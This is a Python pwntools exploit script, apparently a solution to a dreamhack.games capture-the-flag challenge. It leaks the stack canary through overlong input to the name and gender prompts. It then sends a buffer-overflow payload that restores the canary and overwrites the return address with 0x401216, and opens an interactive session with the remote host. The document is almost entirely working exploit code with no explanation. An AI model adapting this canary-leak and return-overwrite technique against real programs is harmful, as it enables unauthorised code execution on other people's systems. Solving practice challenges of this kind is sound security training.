#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 19984)

    return r


def main():
    r = conn()

    r.sendafter(b"Enter name: ", b"A" * 56)    
    r.sendlineafter(b"Enter age: ", str(0x01010101).encode())    
    r.sendlineafter(b"Enter height: ", b"1.111111")    
    r.sendafter(b"Enter M (Male) or F (Female): ", b"A" * 5)    

    person_t_size = 104
    r.recvuntil(b"Hi ")
    r.recvn(person_t_size - 32 + 1)
    canary = b"\x00" + r.recvn(7)

    payload = b"A" * person_t_size
    payload += canary
    payload += b"A" * 8
    payload += p64(0x401216)
    
    r.sendafter(b"What's your nationality? ", payload)    

    r.interactive()


if __name__ == "__main__":
    main()
